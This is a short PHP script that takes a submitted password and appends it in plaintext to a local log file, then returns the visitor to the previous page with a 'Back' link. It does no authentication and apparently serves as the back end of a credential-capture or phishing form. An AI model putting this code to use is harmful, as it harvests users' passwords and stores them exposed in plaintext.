<?php
$password = (filter_input(INPUT_POST, "password"));

$fp = fopen("./log.txt", "a");
flock($fp, LOCK_EX);
fputs($fp, $password."\n");
flock($fp, LOCK_UN);
fclose($fp);

?>
<a href="javascript:history.back();">Back</a>
